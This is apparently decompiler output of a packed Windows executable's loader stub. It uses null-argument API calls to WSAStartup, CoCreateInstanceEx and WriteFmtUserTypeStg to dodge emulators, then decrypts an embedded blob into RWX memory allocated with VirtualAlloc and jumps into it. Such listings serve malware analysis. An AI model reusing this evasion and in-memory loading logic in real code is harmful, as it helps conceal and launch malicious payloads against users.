/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

_BYTE *__stdcall sub_43F000(int, int, unsigned int, int);
int start();

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_401000; // weak
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern HRESULT (__stdcall *WriteFmtUserTypeStg)(LPSTORAGE pstg, CLIPFORMAT cf, LPOLESTR lpszUserType);
// extern HRESULT (__stdcall *CoCreateInstanceEx)(const IID *const Clsid, IUnknown *punkOuter, DWORD dwClsCtx, COSERVERINFO *pServerInfo, DWORD dwCount, MULTI_QI *pResults);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
__int16 word_43F212 = -30631; // weak


//----- (0043F000) --------------------------------------------------------
_BYTE *__stdcall sub_43F000(int a1, int a2, unsigned int a3, int a4)
{
  _BYTE *result; // eax
  char v5; // cl
  unsigned int i; // [esp+8h] [ebp-8h]
  unsigned int v7; // [esp+Ch] [ebp-4h]

  v7 = 0;
  for ( i = 0; i < a3; ++i )
  {
    v5 = *(_DWORD *)(i + a2) - *(_DWORD *)(v7 + a4);
    result = (_BYTE *)(i + a1);
    *result = 0;
    *result -= v5;
    *result = -*result;
    if ( ++v7 == 1 )
      v7 = 0;
    if ( v7 > 0xD6000000 )
      break;
    result = (_BYTE *)(i + 1);
  }
  return result;
}

//----- (0043F092) --------------------------------------------------------
int start()
{
  int result; // eax
  struct WSAData v1; // [esp-10h] [ebp-1E4h] BYREF
  __int16 *v2; // [esp+1ACh] [ebp-28h]
  SIZE_T dwSize; // [esp+1B0h] [ebp-24h]
  int v4; // [esp+1B4h] [ebp-20h]
  char *v5; // [esp+1B8h] [ebp-1Ch]
  int v6; // [esp+1BCh] [ebp-18h]
  char *v7; // [esp+1C0h] [ebp-14h]
  char *v8; // [esp+1C4h] [ebp-10h]
  void *v9; // [esp+1C8h] [ebp-Ch]
  char *v10; // [esp+1CCh] [ebp-8h]
  int v11; // [esp+1D0h] [ebp-4h]
  int savedregs; // [esp+1D4h] [ebp+0h] BYREF

  v2 = 0;
  memset(&v1, 0, 16);
  result = WSAStartup(0, &v1);
  if ( *(_DWORD *)&v1.wVersion )
  {
    result = CoCreateInstanceEx((const IID *const)&savedregs, 0, 0, 0, 0, 0) + 2147221008;
    if ( !result )
    {
      result = WriteFmtUserTypeStg(0, 0, 0) + 2147024809;
      if ( !result )
      {
        v9 = &unk_401000;
        v8 = &v1.szDescription[56];
        v2 = &word_43F212;
        v5 = &v1.szDescription[72];
        v11 = 56;
        sub_43F000((int)&v1.szDescription[56], (int)&unk_401000, 0x38u, (int)&word_43F212);
        dwSize = *(_DWORD *)v8 + *((_DWORD *)v8 + 1);
        v10 = (char *)VirtualAlloc(0, dwSize, 0x3000u, 0x40u);
        v4 = 0x400000;
        v6 = 0;
        *(_DWORD *)&v1.szDescription[52] = 0;
        while ( *(_DWORD *)&v1.szDescription[52] < *((_DWORD *)v8 + 2) )
        {
          *(_DWORD *)&v1.szDescription[8] = v2;
          sub_43F000((int)&v10[v6], *(_DWORD *)v5 + v4, *((_DWORD *)v5 + 1), (int)v2);
          v6 += *((_DWORD *)v5 + 1);
          ++*(_DWORD *)&v1.szDescription[52];
          v5 += 8;
        }
        *(_DWORD *)&v1.szDescription[8] = v4;
        v7 = v10 + 5776;
        *(_DWORD *)&v1.szDescription[4] = *(_DWORD *)&v1.szDescription[68];
        *(_DWORD *)v1.szDescription = &v10[*((_DWORD *)v8 + 1)];
        __asm { jmp     [ebp+var_14] }
      }
    }
  }
  __debugbreak();
  return result;
}
// 43F212: using guessed type __int16 word_43F212;

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
